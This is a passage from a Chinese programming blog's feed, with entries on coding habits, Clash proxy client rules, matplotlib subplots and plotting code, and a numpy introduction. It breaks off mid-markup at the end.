        <content type="html"><![CDATA[<ol start="0" type="1"><li><p>Think twice before you start typing</p></li><li><p>最重要的应该是通过前期做好设计，中期走读逻辑，后期测试分析，来提高代码质量，缩短开发时间。</p></li><li><p>学会目标的分解</p><p>每次编码的时候将目标聚集在一个尽可能小的点上,比如实现一个函数,把接口出口参数等都考虑清楚,精神集中,要做到一次编译不是难事.学会目标的分解,不要一次性做太多的事情,不仅是好的编码规范,也是好的编程习惯.</p></li><li><p>单元测试</p><p>写完一个小的功能点测试一下</p></li><li><p>对每一个小问题追根究底</p><p>分析错误, 为什么出现, 导致什么现象，根因是什么，怎么解决</p><p>“边界条件写错” 这个需要自己思考。 “调用变量混淆”这个需要好的<strong>编程风格</strong>。 “少写反括号” 需要 IDE。</p></li><li><p>编程风格</p></li><li><p>代码结构、模块化</p></li><li><p>语法熟练程度</p></li></ol><h2 id="高阶调试技巧">高阶调试技巧</h2><ol type="1"><li><p>多线程调试</p></li><li><p>Drop Frame</p><p>后退执行</p></li><li><p>条件断点</p></li><li><p>执行临时代码</p></li></ol><h2 id="参考资料">参考资料</h2><blockquote><ol type="1"><li><ahref="https://www.zhihu.com/question/27567688">资深程序员有哪些经验和技巧可以使自己写代码一遍编译通过，减少低级bug？</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Clash 使用 Tips</title>
      <link href="/blog/2022/07/02/misc/clash/"/>
      <url>/blog/2022/07/02/misc/clash/</url>
      
        <content type="html"><![CDATA[<h2 id="常用选项">常用选项</h2><ol type="1"><li><p>开启 General 下的 Allow LAN， Mixin， System Proxy， Start withWindows</p><p>Allow LAN: 允许局域网联机，使用虚拟机时直接局域网代理 Mixin：不同协议端口混合都用一个端口</p></li><li><p>Pofiles 下的配置，右键选择 setting，将 Update Interval设置为最小整数 1,</p><p>有时候更新稍微一慢，节点就不行了，勤更新</p></li></ol><h2 id="clash-使用-parser-添加自定义规则并防止更新覆盖">Clash 使用Parser 添加自定义规则并防止更新覆盖</h2><p>IEEE有时候国内连不上，需要上外网，但是订阅的规则里面将其写为了直连，每一次更新订阅节点，我自定义规则就会被覆盖，造成规则丢失，因此找到这个方法。</p><ol type="1"><li><p>打开 <code>Setting</code>（设置），找到<code>Profiles</code>（配置文件下）的 <code>Parsers</code></p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220702230529.png"alt="20220702230529" /><figcaption aria-hidden="true">20220702230529</figcaption></figure></li><li><p>点击右侧的 <code>Edit</code>，打开编辑界面。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/20220702230419.png"alt="20220702230419" /><figcaption aria-hidden="true">20220702230419</figcaption></figure><p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">parsers: # array</span><br><span class="line">    - url: https://xxx</span><br><span class="line">    yaml:</span><br><span class="line">        prepend-rules:</span><br><span class="line">            - DOMAIN-SUFFIX,ieee.org,DIRECT</span><br></pre></td></tr></table></figure></p><p>url：改成本人的订阅地址，如果不知道，可以直接在 Profiles下点击当前订阅的 settings，复制其中的 URL 即可。prepen-rules：此处添加你的自定义规则，每一条占一行，按照（规则类型，值，代理策略）排列，使用逗号分隔。注意的是，每一行都需要以一个短横线加空格的开头，同时注意对齐。具体的自定义规则如何书写在本文的后半部分有说明。编辑完成后，点击右下角保存。到 Profiles里更新订阅，这样就可以将新的规则添加上了。可以点击 edit rules查看规则进行验证。之后打开相应网页看是否生效。</p></li><li><p>代理策略的选择</p><p>一般情况我们使用 DIRECT，GLOBAL，REJECT。DIRECT表示不走代理，即不通过代理节点直接连接。GLOBAL则是走全局代理节点。REJECT 则表示禁止连接，使用 REJECT后，将会屏蔽对应网站。</p><p>有一些订阅还提供了很多自制的策略，可以自行尝试。使用时直接输入名字即可，中文也是支持的。</p><p>点击 General，点击 Home Directory 下的 OpenFolder，打开配置文件夹，点击 Profiles 文件夹，找到对应的 yml文件，用记事本等软件打开，直接复制粘贴就可以啦 或者 Profiles 下点击 EditExternally 便可以。</p></li><li><p>原理介绍</p><p>Parser 功能是配置文件进行预处理，因此，每一次更新都会执行一次Parser，因此自定义规则会永远存在，只要你不删除 Parser。</p></li></ol><h1 id="参考">参考</h1><p><a href="https://chenjuefei.com:444/117.html">Clash 使用 Parser添加自定义规则并防止更新覆盖 - 觉今是而昨非 - Blog</a></p>]]></content>
      
      
      <categories>
          
          <category> misc </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Matplotlib 库-简介与绘制子图</title>
      <link href="/blog/2022/06/25/programming/python/ai/plot_subplot/"/>
      <url>/blog/2022/06/25/programming/python/ai/plot_subplot/</url>
      
        <content type="html"><![CDATA[<p>导入 Matplotlib 库中的 pyplot 子库<code>import matplotlib.pyplot as plt</code></p><h2 id="使用-figure-对象作为画布画图">使用 Figure 对象作为画布画图</h2><p>figure(num,figsize,dpi,facecolor,edgecolor,frameon) num:图形编号或名称，取值为数字/字符串 figsize：绘画对象的宽和高，单位为英寸dpi：绘图对象的分辨率，缺省为 80 facecolor：背景颜色 edgecolor：边框颜色frameon：表示是否显示边框</p><table><thead><tr class="header"><th>颜色</th><th>缩略字符</th><th>颜色</th><th>缩略字符</th></tr></thead><tbody><tr class="odd"><td>blue</td><td>b</td><td>black</td><td>k</td></tr><tr class="even"><td>green</td><td>9</td><td>white</td><td>W</td></tr><tr class="odd"><td>red</td><td>r</td><td>cyan</td><td>C</td></tr><tr class="even"><td>yellow</td><td>y</td><td>magenta</td><td>m</td></tr></tbody></table><h2 id="子图">子图</h2><p><code>subplot(行数，列数，子图序号)</code>子图序号编号规定：从左到右，从上到下。 <imgsrc="media/16151198206029/16151219472361.jpg" /></p><p>每个 subplot 只创建一个子图</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line">plt.subplot(<span class="number">2</span>,<span class="number">2</span>,<span class="number">4</span>)</span><br></pre></td></tr></table></figure><p>设置中文字体:<code>plt.rcParams["font.sans-serif"]="SimHei"</code></p><p>Mac 下可以用以下代码查看 matplotlib 可以使用的字体, 我是用 "PingFangHK" 字体。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">from matplotlib import font_manager</span><br><span class="line">font_set = &#123;f.name for f in font_manager.fontManager.ttflist&#125;</span><br><span class="line">for f in font_set:</span><br><span class="line">    print(f)</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th>中文字体</th><th>英文描述</th><th>中文字体</th><th>英文描述</th></tr></thead><tbody><tr class="odd"><td>宋体</td><td>SimSun</td><td>楷体</td><td>KaiTi</td></tr><tr class="even"><td>黑体</td><td>SimHei</td><td>仿宋</td><td>FangSong</td></tr><tr class="odd"><td>微软雅黑</td><td>Microsoft YaHei</td><td>隶书</td><td>LiSu</td></tr><tr class="even"><td>微软正黑体</td><td>Microsoft JhengHei</td><td>幼圆</td><td>YouYuan</td></tr></tbody></table><p>恢复标准默认配置：<code>plt.rcdefaults()</code></p><h2 id="标题">标题</h2><p>添加全局标题：<code>suptitle(标题文字)</code>添加子标题：<code>title(标题文字)</code></p><p>suptitle 函数参数：</p><table><thead><tr class="header"><th>参数</th><th>说明</th><th>默认值</th></tr></thead><tbody><tr class="odd"><td>X</td><td>标题位置的 x 坐标</td><td>0.5</td></tr><tr class="even"><td>y</td><td>标题位置的 y 坐标</td><td>0.98</td></tr><tr class="odd"><td>color</td><td>标题颜色</td><td>黑色</td></tr><tr class="even"><td>backgroundcolor</td><td>标题背景颜色</td><td>12</td></tr><tr class="odd"><td>fontsize</td><td>标题的字体大小</td><td></td></tr><tr class="even"><td>fontweight</td><td>字体粗细</td><td>normal</td></tr><tr class="odd"><td>fontstyle</td><td>设置字体类型</td><td></td></tr><tr class="even"><td>horizontalalignment</td><td>标题水平对齐方式</td><td>center</td></tr><tr class="odd"><td>verticalalignment</td><td>标题的垂直对齐方式</td><td>top</td></tr></tbody></table><table><thead><tr class="header"><th>fontsize</th><th>fontweight</th></tr></thead><tbody><tr class="odd"><td>xx-small</td><td>light</td></tr><tr class="even"><td>x-small</td><td>normal</td></tr><tr class="odd"><td>small</td><td>medium</td></tr><tr class="even"><td>medium</td><td>semibold</td></tr><tr class="odd"><td>large</td><td>bold</td></tr><tr class="even"><td>x-large</td><td>heavy</td></tr><tr class="odd"><td>xx-large</td><td>black</td></tr></tbody></table><p>title() 函数参数：</p><table><thead><tr class="header"><th>参数</th><th>说明</th><th>取值</th></tr></thead><tbody><tr class="odd"><td>loc</td><td>标题位置</td><td>left, right</td></tr><tr class="even"><td>rotation</td><td>标题文字旋转角度</td><td></td></tr><tr class="odd"><td>color</td><td>标题颜色</td><td>黑色</td></tr><tr class="even"><td>fontsize</td><td>标题的字体大小</td><td></td></tr><tr class="odd"><td>fontweight</td><td>字体粗细</td><td>normal</td></tr><tr class="even"><td>fontstyle</td><td>设置字体类型</td><td></td></tr><tr class="odd"><td>horizontalalignment</td><td>标题水平对齐方式</td><td>center</td></tr><tr class="even"><td>_verticalalignment</td><td>标题的垂直对齐方式</td><td>top</td></tr><tr class="odd"><td>fontdict</td><td>设置参数字典</td><td></td></tr></tbody></table><p>tight_layout(rect=[left, bottom, right, top])函数检查坐标轴标签、刻度标签、和子图标题，自动调整子图，使之填充<strong>整个</strong>绘图区域(会影响全局标题)，并消除子图之间的重叠。</p><h2 id="参考推荐">参考推荐</h2><ol type="1"><li><a href="https://zhuanlan.zhihu.com/p/139052035">matplotlib.pyplot的使用总结大全（入门加进阶）</a></li><li><a href="https://dwy6626.github.io/post/matplotlib-font/">Matplotlib中文字體亂碼問題</a></li><li><a href="https://mshk.top/2019/08/macos-matplotlib/">MacOS 设置下matplotlib 显示中文</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>matplotlib 之科研常用画图代码</title>
      <link href="/blog/2022/06/24/programming/python/ai/plot_academaic/"/>
      <url>/blog/2022/06/24/programming/python/ai/plot_academaic/</url>
      
        <content type="html"><![CDATA[<h2 id="完整代码">完整代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">import numpy as np</span><br><span class="line">import matplotlib.pyplot as plt</span><br><span class="line"></span><br><span class="line">folder_name = f&quot;plot/c&#123;cost_value&#125;logs.txt&quot;</span><br><span class="line">tpl = np.loadtxt(folder_name, delimiter=&#x27; &#x27;,unpack=True) # 读取一行</span><br><span class="line">dc_data[cost_value] = tpl[-3]</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    plt.rcParams[&#x27;xtick.direction&#x27;] = &#x27;in&#x27;  # 将x周的刻度线方向设置向内</span><br><span class="line">    plt.rcParams[&#x27;ytick.direction&#x27;] = &#x27;in&#x27;  # 将y轴的刻度线方向设置向内</span><br><span class="line">    plt.rcParams[&#x27;font.sans-serif&#x27;] = [&#x27;Times New Roman&#x27;] # 设置字体</span><br><span class="line">    plt.rcParams[&#x27;figure.figsize&#x27;] = (12, 10) # 设置图片大小</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    cost_values = [&quot;1.5&quot;, &quot;1&quot;, &quot;0.5&quot;, &quot;0.1&quot;]</span><br><span class="line">    x_tick = np.array([2, 3, 4, 5, 6, 7, 8, 9], dtype=int)</span><br><span class="line">    types = [f&quot;$c$=&#123;cost_value&#125;&quot; for cost_value in cost_values]</span><br><span class="line"></span><br><span class="line">    dc_data, fig_name, (xlabel, ylabel), ylim_tuple = quality(</span><br><span class="line">        cost_values)</span><br><span class="line"></span><br><span class="line">    markers = [&#x27;&gt;&#x27;, &#x27;x&#x27;, &#x27;o&#x27;, &quot;d&quot;]</span><br><span class="line">    for idx, cost_value in enumerate(cost_values):</span><br><span class="line">        plt.plot(x_tick, dc_data[cost_value],</span><br><span class="line">                 label=types[idx], marker=markers[idx], linewidth=3, markersize=12, markeredgewidth=5)</span><br><span class="line"></span><br><span class="line">    plt.xlabel(xlabel, fontsize=30)  # 横坐标名字</span><br><span class="line">    plt.ylabel(ylabel, fontsize=30)  # 纵坐标名字</span><br><span class="line">    plt.xticks(fontproperties=&#x27;Times New Roman&#x27;, size=23) # 设置 tick 属性</span><br><span class="line">    plt.yticks(fontproperties=&#x27;Times New Roman&#x27;, size=23)</span><br><span class="line">    plt.legend(loc=&quot;best&quot;, ncol=2, prop=&#123;</span><br><span class="line">               &#x27;family&#x27;: &#x27;Times New Roman&#x27;, &#x27;size&#x27;: 23&#125;) # 设置图例属性</span><br><span class="line">    plt.grid() # 设置x y 轴网格</span><br><span class="line">    plt.xlim(2, 9)</span><br><span class="line">    # plt.semilogy()  # y轴取对数</span><br><span class="line">    plt.ylim(ylim_tuple)  # 限制y轴长度 0.9*1e5, 1.0*1e5</span><br><span class="line">    plt.savefig(fig_name, dpi=300, bbox_inches=&#x27;tight&#x27;)</span><br><span class="line">    # plt.show()</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="0" type="1"><li>numpy 读取数据，方便快捷，后期处理也方便</li><li>刻度线向内</li><li>设置字体</li><li>y 轴图像/折线间隔过度稀疏或稠密，对 y 轴取对数</li><li>对折线或者柱状图设置 marker 及其大小，看起来内容更充足</li><li>设置 y 轴的范围，拉长或者缩短 y 轴</li><li><code>plt.savefig('fig.png',dpi=300, bbox_inches='tight')</code> 以dpi 300 的清晰度保存图片，同时通过 <code>bbox_inches='tight'</code>选项设置去除图片四周无用空白</li></ol><p>注： <code>plt.tight_layout()</code> 不经常有用，只用<code>bbox_inches='tight'</code> 即可。</p><p><ahref="https://stackoverflow.com/questions/35393863/matplotlib-error-figure-includes-axes-that-are-not-compatible-with-tight-layou">python- Matplotlib Error: "figure includes Axes that are not compatible withtight_layout" - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>numpy 入门</title>
      <link href="/blog/2022/06/15/programming/python/ai/np_intro/"/>
      <url>/blog/2022/06/15/programming/python/ai/np_intro/</url>
      
        <content type="html"><![CDATA[<h1 id="numpy-库">numpy 库</h1><h2 id="简介">简介</h2><ol type="1"><li>提供了多维数组、矩阵的常用操作和一些高效的科学计算函数。</li><li>底层运算通过 C语言实现，处理速度快、效率高，适用于大规模多维数组。</li><li>可以直接完成数组和矩阵运算，无需循环。</li></ol><h2 id="多维数组">多维数组</h2><p>形状(Shape):是一个元组,描述数组的维度,以及各个维度的长度。长度(Length):某个维度中的元素个数。 shape(5,) 长度为 5 的一维数组，shape(30,5) 30x5 的二维数组，shape(10, )</p><p>NumPy 数组 ★ 每个数组都是一个 ndarray 对象 ★ 数组中的元素数据类型相同★ 数组中的元素下标从 0 开始 ★数组对象的常用属性：维数、形状、数据类型等。</p><h3 id="数组创建">数组创建</h3><p>array([list]/(tuple)) 定义数组时，可以指定 dtype 数据类型:array([list]/(tuple)，dtype=数据类型)</p><p>asarray() 函数：将列表或元组转化为数组对象</p><p>当数据源本身已经是一个 ndarray 对象时, array()仍然会复制出一个副本,而 asarray() 则直接引用了本来的数组。</p><h3 id="数组属性">数组属性</h3><table><thead><tr class="header"><th>属性</th><th>描述</th></tr></thead><tbody><tr class="odd"><td>ndim</td><td>数组的维数</td></tr><tr class="even"><td>shape</td><td>数组的形状</td></tr><tr class="odd"><td>size</td><td>数组元素的总个数</td></tr><tr class="even"><td>dtype</td><td>数组中元素的数据类型</td></tr><tr class="odd"><td>itemsize</td><td>数组中每个元素的字节数</td></tr></tbody></table><h3 id="特殊数组">特殊数组</h3><table><thead><tr class="header"><th>函 数</th><th>功能描述</th></tr></thead><tbody><tr class="odd"><td>np.arange()</td><td>创建数字序列数组</td></tr><tr class="even"><td>np.ones()</td><td>创建全 1 数组</td></tr><tr class="odd"><td>np.zeros()</td><td>创建全 0 数组</td></tr><tr class="even"><td>np.eye()</td><td>创建单位矩阵</td></tr><tr class="odd"><td>np.linspace()</td><td>创建等差数列</td></tr><tr class="even"><td>np.logspace()</td><td>创建等比数列</td></tr></tbody></table><ol type="1"><li>arange() 函数：创建一个由数字序列构成的数组(步长可为小数)，类似于range() <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">np.arange(起始数字，结束数字，步长，dtype=数据类型)</span><br><span class="line">np.arange(<span class="number">4</span>)</span><br><span class="line">np.arange(<span class="number">0</span>,<span class="number">2</span>,<span class="number">0.2</span>)</span><br></pre></td></tr></table></figure></li><li>ones() 函数：创建一个元素全部为 1 的数组 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">np.ones(shape, dtype=数据类型)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.ones((<span class="number">3</span>,<span class="number">2</span>),dtype=np.int32)</span><br><span class="line">array([[<span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">   [<span class="number">1</span>, <span class="number">1</span>],</span><br><span class="line">   [<span class="number">1</span>, <span class="number">1</span>]], dtype=int32)</span><br><span class="line"><span class="comment"># 默认是 float64 类型</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>np.ones((<span class="number">3</span>,<span class="number">2</span>))</span><br><span class="line">array([[<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>],</span><br><span class="line">       [<span class="number">1.</span>, <span class="number">1.</span>]])</span><br></pre></td></tr></table></figure></li><li>zeros() 函数，np.zeros(shape, dtype=数据类型)</li><li>eye() 函数，np.eye(shape) shape 不用单独加元组括号</li><li>linspace()函数 <code>np.linspace(start, stop, num)</code> 区间[start, stop]中 num 个数</li><li>logspace() 函数 <code>np.logspace(start, stop, num, base)</code>区间 [base^start, base^stop]中 num 个数</li></ol><h2 id="数组切片">数组切片</h2><p>二维数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>b</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">       [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">       [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]])</span><br><span class="line"><span class="comment"># 切前两维数组</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[:<span class="number">2</span>]</span><br><span class="line">array([[<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>],</span><br><span class="line">       [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>]])</span><br><span class="line"><span class="comment"># 切某一列</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[:,<span class="number">2</span>]</span><br><span class="line">array([ <span class="number">2</span>,  <span class="number">6</span>, <span class="number">10</span>])</span><br></pre></td></tr></table></figure><p>三维数组</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">3</span>]: t</span><br><span class="line">Out[<span class="number">3</span>]:</span><br><span class="line">array([[[ <span class="number">0</span>,  <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>,  <span class="number">7</span>],</span><br><span class="line">        [ <span class="number">8</span>,  <span class="number">9</span>, <span class="number">10</span>, <span class="number">11</span>]],</span><br><span class="line"></span><br><span class="line">       [[<span class="number">12</span>, <span class="number">13</span>, <span class="number">14</span>, <span class="number">15</span>],</span><br><span class="line">        [<span class="number">16</span>, <span class="number">17</span>, <span class="number">18</span>, <span class="number">19</span>],</span><br><span class="line">        [<span class="number">20</span>, <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>]]])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 全部维度，全部行，第一列</span></span><br><span class="line">In [<span class="number">4</span>]: t[:,:,<span class="number">0</span>]</span><br><span class="line">Out[<span class="number">4</span>]:</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">4</span>,  <span class="number">8</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">16</span>, <span class="number">20</span>]])</span><br><span class="line"><span class="comment"># 全部维度，第三行，第一列</span></span><br><span class="line">In [<span class="number">5</span>]: t[:,<span class="number">2</span>,<span class="number">0</span>]</span><br><span class="line">Out[<span class="number">5</span>]: array([ <span class="number">8</span>, <span class="number">20</span>])</span><br><span class="line"><span class="comment"># 全部维度，第1，2行，第一列</span></span><br><span class="line">In [<span class="number">6</span>]: t[:,<span class="number">0</span>:<span class="number">2</span>,<span class="number">0</span>]</span><br><span class="line">Out[<span class="number">6</span>]:</span><br><span class="line">array([[ <span class="number">0</span>,  <span class="number">4</span>],</span><br><span class="line">       [<span class="number">12</span>, <span class="number">16</span>]])</span><br></pre></td></tr></table></figure><h2 id="改变数组形状">改变数组形状</h2><table><thead><tr class="header"><th>函数</th><th>功能描述</th></tr></thead><tbody><tr class="odd"><td>np.reshape(shape)</td><td>不改变当前数组,按照 shape 创建新的数组</td></tr><tr class="even"><td>np.resize(shape)</td><td>改变当前数组,按照 shape 创建数组</td></tr></tbody></table><p>注意：当改变形状时，应该考虑到数组中元素的个数，确保改变前后，元素总个数相等。</p><p>创建数组，并改变数组形状</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">63</span>]: a=np.logspace(<span class="number">0</span>,<span class="number">5</span>,<span class="number">6</span>,base=<span class="number">2</span>,dtype=np.int64).reshape(<span class="number">2</span>,<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">64</span>]: a</span><br><span class="line">Out[<span class="number">64</span>]:</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>]])</span><br></pre></td></tr></table></figure><p>np.reshape(shape) 中 shape 的值可以把其中的某一个维度设置为 -1，让numpy根据数组中元素总个数、以及其他维度的取值，来自动计算出这个维度的取值。例如：将多维转换为一维</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">67</span>]: a</span><br><span class="line">Out[<span class="number">67</span>]:</span><br><span class="line">array([[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>, <span class="number">16</span>, <span class="number">32</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">68</span>]: a.reshape(-<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">Out[<span class="number">68</span>]:</span><br><span class="line">array([[ <span class="number">1</span>],</span><br><span class="line">       [ <span class="number">2</span>],</span><br><span class="line">       [ <span class="number">4</span>],</span><br><span class="line">       [ <span class="number">8</span>],</span><br><span class="line">       [<span class="number">16</span>],</span><br><span class="line">       [<span class="number">32</span>]])</span><br></pre></td></tr></table></figure><h2 id="数组运算">数组运算</h2><p>numpy 支持数组的四则运算和逆运算.一维数组可以和多维数组相加，相加时，会将一维数组扩展到多维。当两个数组中元素的数据类型不同时，精度低的数据类型，会自动转换为精度更高的数据类型，然后再进行运算。</p><p>幂运算：对数组中的每个元素求 n 次方</p><p>矩阵相乘：</p><ul><li>乘号运算符：矩阵中对应的元素分别相乘，c=a*b</li><li>矩阵相乘（点乘）：按照矩阵相乘的规则运算 np.matmul(a,b)np.dot(a,b)</li></ul><p>矩阵转置和求逆 矩阵转置：np.transpose(a)矩阵求逆：np.linalg.inv(a)</p><h2 id="数组元素之间的运算">数组元素之间的运算</h2><table><thead><tr class="header"><th>函数</th><th>功能描述</th></tr></thead><tbody><tr class="odd"><td>numpy.sum()</td><td>计算所有元素的和</td></tr><tr class="even"><td>numpy.prod()</td><td>计算所有元素的乘积</td></tr><tr class="odd"><td>numpy.dif()</td><td>计算数组的相邻元素之间的差</td></tr><tr class="even"><td>np.sqrt()</td><td>计算各元素的平方根</td></tr><tr class="odd"><td>np.exp()</td><td>计算各元素的指数值</td></tr><tr class="even"><td>np.abs()</td><td>取各元素的绝对值</td></tr></tbody></table><h3 id="求和">求和</h3><p>轴（axis）：数组中的<strong>每一个维度</strong>被称为一个<strong>轴</strong>。秩（rank）：轴的个数。</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151051607795.jpg"alt="16151051607795" /><figcaption aria-hidden="true">16151051607795</figcaption></figure><h3 id="数组堆叠">数组堆叠</h3><p><code>np.stack((数组1，数组2,..), axis)</code>在不同的轴方向上，进行堆叠,新出现的轴是哪个轴，axis=几</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151055149631.jpg"alt="16151055149631" /><figcaption aria-hidden="true">16151055149631</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">120</span>]: a = np.array([[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>], [<span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">121</span>]: b = np.array([[<span class="number">7</span>, <span class="number">8</span>, <span class="number">9</span>], [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">122</span>]: c=np.stack((a, b), axis=<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">In [<span class="number">123</span>]: c</span><br><span class="line">Out[<span class="number">123</span>]:</span><br><span class="line">array([[[ <span class="number">1</span>,  <span class="number">2</span>,  <span class="number">3</span>],</span><br><span class="line">        [ <span class="number">7</span>,  <span class="number">8</span>,  <span class="number">9</span>]],</span><br><span class="line"></span><br><span class="line">       [[ <span class="number">4</span>,  <span class="number">5</span>,  <span class="number">6</span>],</span><br><span class="line">        [<span class="number">10</span>, <span class="number">11</span>, <span class="number">12</span>]]])</span><br><span class="line"></span><br><span class="line">In [<span class="number">124</span>]: <span class="built_in">print</span>(c.shape)</span><br><span class="line">(<span class="number">2</span>, <span class="number">2</span>, <span class="number">3</span>)</span><br></pre></td></tr></table></figure><h2 